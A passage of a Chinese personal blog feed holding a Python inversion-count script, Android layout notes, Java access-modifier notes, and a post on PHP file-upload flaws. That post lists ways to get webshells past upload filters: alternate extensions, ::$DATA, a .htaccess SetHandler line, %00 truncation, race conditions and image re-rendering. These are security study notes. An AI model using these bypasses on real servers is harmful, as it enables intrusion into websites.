class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author: K1t0</span></span><br><span class="line"><span class="comment"># @Time: 2024/9/19</span></span><br><span class="line"><span class="comment"># @Description: 分治算法 逆序数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数功能: SAC 算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SAC</span>(<span class="params">list2</span>):</span><br><span class="line">    <span class="comment"># 递归结束判定条件</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(list2) &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="comment"># 分组序列 A ,B Num_A Num_B</span></span><br><span class="line">    A=[];B=[]</span><br><span class="line">    Num_A=<span class="built_in">len</span>(list2)//<span class="number">2</span></span><br><span class="line">    Num_B=<span class="built_in">len</span>(list2)-Num_A</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list2)):</span><br><span class="line">        <span class="keyword">if</span> i&lt;Num_A:</span><br><span class="line">            A.append(list2[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            B.append(list2[i])</span><br><span class="line">    rA=SAC(A)</span><br><span class="line">    rB=SAC(B)</span><br><span class="line">    r=MAC(A,B,list2)</span><br><span class="line">    <span class="keyword">return</span> r+rA+rB</span><br><span class="line"><span class="comment"># 函数功能:MAC 算法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MAC</span>(<span class="params">A,B,C</span>):</span><br><span class="line">    <span class="comment"># A B C 下标</span></span><br><span class="line">    i=<span class="number">0</span>;j=<span class="number">0</span>;k=<span class="number">0</span>;count=<span class="number">0</span></span><br><span class="line">    <span class="comment"># A B 逆序判定</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;<span class="built_in">len</span>(A) <span class="keyword">and</span> j &lt;<span class="built_in">len</span>(B):</span><br><span class="line">        <span class="keyword">if</span> A[i]&gt;B[j]:</span><br><span class="line">            count+=<span class="built_in">len</span>(A)-i</span><br><span class="line">            C[k]=B[j]</span><br><span class="line">            j+=<span class="number">1</span>;k+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            C[k]=(A[i])</span><br><span class="line">            i+=<span class="number">1</span>;k+=<span class="number">1</span></span><br><span class="line">    <span class="comment"># 任何一方 结束，另一方全部加入C的序列中</span></span><br><span class="line">    <span class="keyword">if</span> i==<span class="built_in">len</span>(A) <span class="keyword">and</span> j&lt;<span class="built_in">len</span>(B):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(j,<span class="built_in">len</span>(B)):</span><br><span class="line">            C[k]=B[c]</span><br><span class="line">            k+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(A) <span class="keyword">and</span> j==<span class="built_in">len</span>(B):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(i,<span class="built_in">len</span>(A)):</span><br><span class="line">            C[k]=A[c]</span><br><span class="line">            k+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 接收序列</span></span><br><span class="line">    list1=<span class="built_in">input</span>(<span class="string">&quot;Input your list:&quot;</span>).split()</span><br><span class="line">    list2=[<span class="built_in">int</span>(num) <span class="keyword">for</span> num <span class="keyword">in</span> list1 ]</span><br><span class="line">    <span class="built_in">print</span>(SAC(list2))</span><br><span class="line">    <span class="built_in">print</span>(list2)</span><br></pre></td></tr></table></figure><h5 id="一些理解"><a href="#一些理解" class="headerlink" title="一些理解"></a>一些理解</h5><p>首先分治算法非常的简单，但是在写代码的时候总是会出现问题，首先就是因为这个参数传递的问题，因为java参数传递是引用传递，但是python传递是通过可变类型传递，因此我们需要传递一个参数进去才能达到引用的效果。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android_UI设计</title>
      <link href="/2024/09/19/Android-UI%E8%AE%BE%E8%AE%A1/"/>
      <url>/2024/09/19/Android-UI%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="控件"><a href="#控件" class="headerlink" title="控件"></a>控件</h3><p>控件是用户与应用交互的元素。常见的控件包括：</p><ol><li><strong>按钮 (Button)</strong>：用于执行动作。</li><li><strong>文本框 (EditText)</strong>：让用户输入文本。</li><li><strong>复选框 (CheckBox)</strong>：允许用户选择或取消选择某个选项。</li><li><strong>单选按钮 (RadioButton)</strong>：用于在多个选项中选择一个。</li><li><strong>下拉列表 (Spinner)</strong>：提供一个选择列表。</li><li><strong>图像视图 (ImageView)</strong>：显示图片。</li></ol><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>容器用于组织和布局控件。常见的容器包括：</p><ol><li><strong>线性布局 (LinearLayout)</strong>：按水平或垂直方向排列子控件。</li><li><strong>相对布局 (RelativeLayout)</strong>：子控件可以相对其他控件或父容器进行定位。</li><li><strong>约束布局 (ConstraintLayout)</strong>：灵活的布局方式，支持复杂的界面设计。</li><li><strong>网格布局 (GridLayout)</strong>：将控件排列成网格的形式</li></ol><h3 id="顶层容器"><a href="#顶层容器" class="headerlink" title="顶层容器"></a>顶层容器</h3><p>顶层容器是整个界面的基础，通常是应用的主布局。常见的有：</p><ul><li><strong>Activity</strong>：代表一个单一的界面。</li><li><strong>Fragment</strong>：可以在Activity内重用，便于管理不同的界面部分。</li></ul><h3 id="中间容器"><a href="#中间容器" class="headerlink" title="中间容器"></a>中间容器</h3><p>中间容器用于组织和布局控件，通常用于分组和控制排列方式。包括：</p><ul><li><strong>LinearLayout</strong>：可以垂直或水平排列子控件。</li><li><strong>RelativeLayout</strong>：根据控件之间的关系进行布局。</li><li><strong>ConstraintLayout</strong>：用于更复杂的布局，支持灵活的控件定位。</li></ul><p>安卓UI设计中，容器控件是用于组织和管理其他控件的布局元素。以下是一些常见的容器控件及其特点：</p><h3 id="1-LinearLayout"><a href="#1-LinearLayout" class="headerlink" title="1. LinearLayout"></a>1. LinearLayout</h3><ul><li><strong>特点</strong>：将子控件按线性方式排列，可以选择水平或垂直方向。</li><li><strong>用途</strong>：简单的列表或表单布局。</li></ul><h3 id="2-RelativeLayout"><a href="#2-RelativeLayout" class="headerlink" title="2. RelativeLayout"></a>2. RelativeLayout</h3><ul><li><strong>特点</strong>：允许子控件相对其他控件或父容器进行定位。</li><li><strong>用途</strong>：适合需要灵活排列控件的复杂布局。</li></ul><h3 id="3-ConstraintLayout"><a href="#3-ConstraintLayout" class="headerlink" title="3. ConstraintLayout"></a>3. ConstraintLayout</h3><ul><li><strong>特点</strong>：通过约束方式实现灵活布局，能有效减少嵌套，提高性能。</li><li><strong>用途</strong>：适合复杂界面，推荐用于现代应用。</li></ul><h3 id="4-FrameLayout"><a href="#4-FrameLayout" class="headerlink" title="4. FrameLayout"></a>4. FrameLayout</h3><ul><li><strong>特点</strong>：用于堆叠子控件，后添加的控件会覆盖前面的控件。</li><li><strong>用途</strong>：适合需要重叠显示的元素，例如图像叠加。</li></ul><h3 id="5-GridLayout"><a href="#5-GridLayout" class="headerlink" title="5. GridLayout"></a>5. GridLayout</h3><ul><li><strong>特点</strong>：将控件以网格形式排列，指定行和列。</li><li><strong>用途</strong>：适合表格或卡片布局。</li></ul><h3 id="6-ScrollView"><a href="#6-ScrollView" class="headerlink" title="6. ScrollView"></a>6. ScrollView</h3><ul><li><strong>特点</strong>：提供滚动功能，通常只能包含一个子控件。</li><li><strong>用途</strong>：适合内容超出屏幕的情况，便于用户查看。</li></ul><h3 id="7-ViewPager"><a href="#7-ViewPager" class="headerlink" title="7. ViewPager"></a>7. ViewPager</h3><ul><li><strong>特点</strong>：允许用户通过滑动手势在多个页面之间切换。</li><li><strong>用途</strong>：常用于显示一系列的图像或界面。</li></ul><h3 id="8-TabLayout"><a href="#8-TabLayout" class="headerlink" title="8. TabLayout"></a>8. TabLayout</h3><ul><li><strong>特点</strong>：显示选项卡，用户可以通过点击不同的标签切换内容。</li><li><strong>用途</strong>：适合分类展示不同类型的信息。</li></ul><p>一般来讲ui文件为xml ，同时保存在res 中的layout文件夹下。并且有两种模式一种还是text和一种视图状态。</p><h6 id="在Android界面XML中，根标签通常是一个布局控件，决定了界面的整体结构。常见的根标签包括："><a href="#在Android界面XML中，根标签通常是一个布局控件，决定了界面的整体结构。常见的根标签包括：" class="headerlink" title="在Android界面XML中，根标签通常是一个布局控件，决定了界面的整体结构。常见的根标签包括："></a>在Android界面XML中，根标签通常是一个布局控件，决定了界面的整体结构。常见的根标签包括：</h6><h3 id="1-LinearLayout-1"><a href="#1-LinearLayout-1" class="headerlink" title="1. LinearLayout"></a>1. <strong>LinearLayout</strong></h3><ul><li>用于线性排列子控件。</li></ul><h3 id="2-RelativeLayout-1"><a href="#2-RelativeLayout-1" class="headerlink" title="2. RelativeLayout"></a>2. <strong>RelativeLayout</strong></h3><ul><li>允许控件相对定位。</li></ul><h3 id="3-ConstraintLayout-1"><a href="#3-ConstraintLayout-1" class="headerlink" title="3. ConstraintLayout"></a>3. <strong>ConstraintLayout</strong></h3><ul><li>提供灵活的约束布局，适合复杂界面。</li></ul><h3 id="4-FrameLayout-1"><a href="#4-FrameLayout-1" class="headerlink" title="4. FrameLayout"></a>4. <strong>FrameLayout</strong></h3><ul><li>用于简单堆叠子控件。</li></ul><h3 id="5-ScrollView"><a href="#5-ScrollView" class="headerlink" title="5. ScrollView"></a>5. <strong>ScrollView</strong></h3><ul><li>允许内容滚动，通常只包含一个直接子控件。</li></ul><h5 id="android-和api"><a href="#android-和api" class="headerlink" title="android 和api"></a>android 和api</h5><p>Android版本（如Android 9）指的是操作系统的整体版本，包含了一系列功能和用户界面更新。而API级别（如API 35）则是开发者用来编写应用的接口版本，定义了可用的编程功能和特性。</p><h5 id="实操ui设计"><a href="#实操ui设计" class="headerlink" title="实操ui设计"></a>实操ui设计</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240919153809.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240920113015.png" alt="image.png"><br>可以看到有很多控件，我们可以拖动。但是同样也可以修改对齐的标准。这一点只能靠自己摸索。感觉语言表达不出来。</p>]]></content>
      
      
      <categories>
          
          <category> Android移动开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android移动开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传-php</title>
      <link href="/2024/09/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-php/"/>
      <url>/2024/09/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-php/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240611204655.png" alt="image.png"></p><h3 id="查找方式"><a href="#查找方式" class="headerlink" title="查找方式"></a>查找方式</h3><p>***(1) 黑盒 查找(upload) 扫描<br>(2) 应用型 窗口 上传中心或者后台中心 上传     Ps:后台是后台 权限是权限<br>(3) 会员中心<br>(4) 白盒</p><h4 id="基本函数定义-写前端的"><a href="#基本函数定义-写前端的" class="headerlink" title="基本函数定义 写前端的"></a>基本函数定义 写前端的</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Enctype 上传类型</span><br><span class="line"></span><br><span class="line">Method 提交方式</span><br><span class="line"></span><br><span class="line">Onsubmit 鼠标的时间</span><br><span class="line"></span><br><span class="line">Action=<span class="string">&quot;放在指定文件&quot;</span></span><br><span class="line"></span><br><span class="line">Php 接受表单数据 </span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>()函数 是查看有没有点击 提交</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">Trim</span>()  将字符串的 两边的空格 去除掉    替换成空</span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">Strrchr</span>(语句字符串,<span class="string">&#x27;.&#x27;</span>)  意思就是 从.开始断开 输出 .后的语句</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">Strtolower</span>() 转换小写</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">Str_ireplace</span>(<span class="string">&#x27;指定字符&#x27;</span>,<span class="string">&#x27;&#x27;</span>,指定字符串)</span><br><span class="line"></span><br><span class="line">将指定字符串里面的字符转换为空格</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">Array</span>()  是一个数组</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">In_array</span>(<span class="string">&#x27;字符串&#x27;</span>,<span class="string">&#x27;数组&#x27;</span>)  判断字符串是不是在数组中</span><br></pre></td></tr></table></figure><h4 id="文件上传代码"><a href="#文件上传代码" class="headerlink" title="文件上传代码:"></a>文件上传代码:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">在PHP中上传一个文件建一个表单要比ASP中灵活得多。具体的看代码。</span><br><span class="line"></span><br><span class="line">如： </span><br><span class="line"></span><br><span class="line">代码如下:</span><br><span class="line"></span><br><span class="line">&lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;upload.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt; </span><br><span class="line"></span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="string">&quot;1000&quot;</span>&gt; </span><br><span class="line"></span><br><span class="line">&lt;input name=<span class="string">&quot;myFile&quot;</span> type=<span class="string">&quot;file&quot;</span>&gt; </span><br><span class="line"></span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传文件&quot;</span>&gt; </span><br><span class="line"></span><br><span class="line">&lt;/form&gt; </span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_POST </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET </span></span><br><span class="line"></span><br><span class="line">等函数获取表单内容。 </span><br><span class="line"></span><br><span class="line">今天我们着重讲<span class="variable">$_FILES</span>函数。  当客户端提交后，我们获得了一个<span class="variable">$_FILES</span> 数组 </span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>数组内容如下: </span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件的原名称。 </span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如<span class="string">&quot;image/gif&quot;</span>。 </span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 已上传文件的大小，单位为字节。 </span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 <span class="title function_ invoke__">putenv</span>() 函数设置是不起作用的。 </span><br><span class="line"></span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] 和该文件上传相关的错误代码。[<span class="string">&#x27;error&#x27;</span>] 是在 PHP <span class="number">4.2</span>.<span class="number">0</span> 版本中增加的。下面是它的说明：(它们在PHP3.<span class="number">0</span>以后成了常量) </span><br><span class="line"></span><br><span class="line">UPLOAD_ERR_OK </span><br><span class="line"></span><br><span class="line">值：<span class="number">0</span>; 没有错误发生，文件上传成功。 </span><br><span class="line"></span><br><span class="line">UPLOAD_ERR_INI_SIZE </span><br><span class="line"></span><br><span class="line">值：<span class="number">1</span>; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 </span><br><span class="line"></span><br><span class="line">UPLOAD_ERR_FORM_SIZE </span><br><span class="line"></span><br><span class="line">值：<span class="number">2</span>; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 </span><br><span class="line"></span><br><span class="line">UPLOAD_ERR_PARTIAL </span><br><span class="line"></span><br><span class="line">值：<span class="number">3</span>; 文件只有部分被上传。 </span><br><span class="line"></span><br><span class="line">UPLOAD_ERR_NO_FILE </span><br><span class="line"></span><br><span class="line">值：<span class="number">4</span>; 没有文件被上传。 </span><br><span class="line"></span><br><span class="line">值：<span class="number">5</span>; 上传文件大小为<span class="number">0</span>. </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</p><p> 可以看到这个文件上传的机制 没有type的是相当于post传参有type的是****$FILE上传的文件  </p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤:"></a>前端过滤:</h3><p>1.删除掉前端过滤代码</p><p>2.禁用js (一般不推荐)</p><p>3.抓包修改 (ps:但是禁用之后可能就无法抓到数据包，例如只用js代码 只在前端保存)</p><h5 id="mime类型"><a href="#mime类型" class="headerlink" title="mime类型"></a>mime类型</h5><p>Image&#x2F;gif            </p><p>.html文件  text&#x2F;html</p><p> .xml文件  text&#x2F;xml</p><p> .png文件  image&#x2F;png</p><p> .jpeg&#x2F;.jpg image&#x2F;jpeg</p><p> .gif           image&#x2F;gif   </p><p>**mime类型其实就是 检查文件头</p><p>Getimagesize()函数   读取图像的信息 如果这种</p><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>黑名单 :   一些脚本文件绝对不允许上传的   <br>白名单 :相对应的 文件才能</p><p>如果黑名单内部并没有搞到  Php5 或者phtml文件后缀 那么就可以通过这种后缀名字来 绕过但是还是要考虑中间件是否支持<br>**保证在httpd.conf 中保证他可以解析</p><ul><li>.php</li><li>.php3</li><li>.php4</li><li>.php5</li><li>.phtml</li><li>php1</li><li>php2</li></ul><h5 id="后缀名的大小写验证"><a href="#后缀名的大小写验证" class="headerlink" title="后缀名的大小写验证"></a>后缀名的大小写验证</h5><h5 id="后缀强制"><a href="#后缀强制" class="headerlink" title="后缀强制"></a>后缀强制</h5><p>有时候文件上传时候其实 后缀名加上    &#x2F;.  或者 直接加一个 .  不影响木马后缀</p><h5 id="如果源码没有过滤空格的话"><a href="#如果源码没有过滤空格的话" class="headerlink" title="如果源码没有过滤空格的话"></a>如果源码没有过滤空格的话</h5><p>那么可以 在数据包将空格放在后缀名的后面  那么系统就会识别.php空格</p><p>格式匹配就会有绕过</p><h5 id="双写"><a href="#双写" class="headerlink" title="双写"></a>双写</h5><h5 id="不过滤-‘-’"><a href="#不过滤-‘-’" class="headerlink" title="不过滤  ‘.’"></a>不过滤  ‘.’</h5><h5 id="DATA-windows-php"><a href="#DATA-windows-php" class="headerlink" title="::$DATA **windows php"></a>::$DATA **windows php</h5><p>    环境下下的 在后缀名之后加上 ::$DATA 可以 绕过检查  在**php版本五</p><p>如果说不能绕过那可能就是::$DATA被 去除或者加了黑名单<br>前者可以双写绕过</p><table><thead><tr><th>示例</th><th>[[upload1-9.md#3#]]</th></tr></thead></table><blockquote><p>一次过滤或者 循环过滤 绕过点和空格的过滤问题<br>   过滤删除后缀名的的代码那么可以重写</p></blockquote><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><h4 id="上传html-造成xss"><a href="#上传html-造成xss" class="headerlink" title="上传html 造成xss"></a>上传html 造成xss</h4><h4 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h4><p>是<strong>apache</strong>的 一个 配置文件  htaccess文件时Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能</p><p>例如先上传 .htaccess文件 则</p><p>&lt;FilesMatch “.jpg”&gt; SetHandler application&#x2F;x-httpd-php </FilesMatch></p><p>将jpg格式文件当成php代码执行<br>**注意点必须是一定要在 httpd.conf中找到 allowovertide  设置为allow</p><h4 id="​-00-编码-和-0x00-十六进制"><a href="#​-00-编码-和-0x00-十六进制" class="headerlink" title="​%00  编码  和 0x00 十六进制"></a>​%00  编码  和 0x00 十六进制</h4><p>***原理解释:</p><p>了解%00实际上我们要先了解0x00，0x00实际上是一个十六进制表示方式，实际上就是表示ascii码值为0，函数在处理这个字符的时候会把这个字符当做结束符，他们就读取到这里认为这一段结束了。因此如果说我们在进行参数传递使用这个\0 我们可以截断后面的内容。</p><p>**GET传参</p><p>直接对应 1.php%00 ，对应解释一下这个get传参的%00是经历过url编码的。</p><p>**POST传参</p><p>在post数据包后面以十六进制修改0X00  </p><h4 id="​条件竞争"><a href="#​条件竞争" class="headerlink" title="​条件竞争"></a>​条件竞争</h4><p>条件竞争，前提是你上传一个文件，文件会保存，但是之后会有格外的操作。例如判断后缀或者是删除修改等。存在一个逻辑安全问题  ,首先已经保存web.jpg了此时后面的又一个文件操作 , 但是如果说我占用这个 web.jpg.此时后面的操作无法进行。但是我就可以一直上传对应的webshell ，然后使用脚本一直进行访问对应的webshell</p><h4 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h4><p>文件夹类型</p><p>Image.asp&#x2F;1.jpg</p><p>那么此时是 1.jpg 按照asp执行</p><p>文件类型</p><p>1.php:2.jpg</p><p>这也是按照php解析</p><p>Nginx  1.jpg&#x2F;1.php</p><h6 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h6><p>其实针对于,图片解析来讲，如果说我上传了一个图片。他会进行二次的修改和渲染，其实我个人觉得这是一个怎么说呢?这是一个对于有解析漏洞的一个前提。</p><p>**解决:</p><ol><li>首先上传一张正常的图片，找到对应的保存位置。同时下载对应保存好的图片。</li><li>前后两张图片进行比较，找到未渲染的地方(也就是没有修改的地方)，插入我们的木马。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>类</title>
      <link href="/2024/09/17/%E7%B1%BB/"/>
      <url>/2024/09/17/%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>!<img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240917153744.png" alt="image.png"></p><h3 id="包（Package）"><a href="#包（Package）" class="headerlink" title="包（Package）"></a>包（Package）</h3><p>包是用来组织和管理Java类的一种机制。它提供了命名空间，使得不同的类可以归类到不同的包中。在Java中，每个类都必须声明所属的包，或者如果没有声明，默认属于无名（unnamed）包。</p><h3 id="访问修饰符（Access-Modifiers）"><a href="#访问修饰符（Access-Modifiers）" class="headerlink" title="访问修饰符（Access Modifiers）"></a>访问修饰符（Access Modifiers）</h3><p>Java中有几种访问修饰符，用于控制类、方法和变量的可见性和访问权限：</p><ol><li><strong>public</strong>：公共的，可以被任何其他类访问。</li><li><strong>protected</strong>：受保护的，可以被同一包内的类以及子类访问。</li><li><strong>default</strong>（或称为包私有，package-private）：默认的，没有修饰符，只能被同一包内的类访问。</li><li><strong>private</strong>：私有的，只能被当前类内部访问，其他任何类都不能访问。</li></ol><h3 id="访问控制详解"><a href="#访问控制详解" class="headerlink" title="访问控制详解"></a>访问控制详解</h3><p>现在来解释包和访问控制之间的关系：</p><ul><li><p>如果一个类没有指定任何访问修饰符（即使用默认的包私有修饰符），它只能被同一个包中的其他类访问，而不能被其他包的类访问。</p></li><li><p>如果一个类被声明为 <code>public</code>，那么它可以被任何其他类访问，无论这些类是否在同一个包中。</p></li><li><p>如果一个类被声明为 <code>protected</code>，那么它可以被同一个包中的其他类访问，以及其他包中的继承了该类的子类访问。</p></li><li><p>如果一个类被声明为 <code>private</code>，那么它只能被定义该类的源文件内的其他类访问，其他任何地方都不能访问。</p></li><li><p>对于成员变量和方法，同样的规则适用：它们的访问级别也受到类的访问级别和访问修饰符的限制。</p></li></ul><h3 id="例子解释"><a href="#例子解释" class="headerlink" title="例子解释"></a>例子解释</h3><p>假设有如下的类定义：</p><p>javaCopy Code</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> privateVar; </span><br><span class="line">    <span class="type">int</span> defaultVar; </span><br><span class="line">    <span class="keyword">protected</span> <span class="type">int</span> protectedVar; </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> publicVar; </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">privateMethod</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 只能在 MyClass 内部访问 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> <span class="title function_">defaultMethod</span><span class="params">()</span> &#123; </span><br><span class="line"><span class="comment">// 只能在 org.example 包内访问 </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">protectedMethod</span><span class="params">()</span> &#123; </span><br><span class="line"><span class="comment">// 可以在 org.example 包内及其子类中访问 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">publicMethod</span><span class="params">()</span> &#123; </span><br><span class="line"><span class="comment">// 可以被任何地方访问 </span></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的例子中：</p><ul><li><code>privateVar</code> 和 <code>privateMethod()</code> 只能在 <code>MyClass</code> 内部访问，其他任何类都无法访问它们。</li><li><code>defaultVar</code> 和 <code>defaultMethod()</code> 可以在 <code>org.example</code> 包内的任何类访问，但是不能在该包外的类访问。</li><li><code>protectedVar</code> 和 <code>protectedMethod()</code> 可以在 <code>org.example</code> 包内的任何类访问，同时也可以在继承 <code>MyClass</code> 的子类中访问，无论这些子类是否在同一个包中。</li><li><code>publicVar</code> 和 <code>publicMethod()</code> 可以被任何地方的任何类访问。</li></ul><h4 id="java访问策略"><a href="#java访问策略" class="headerlink" 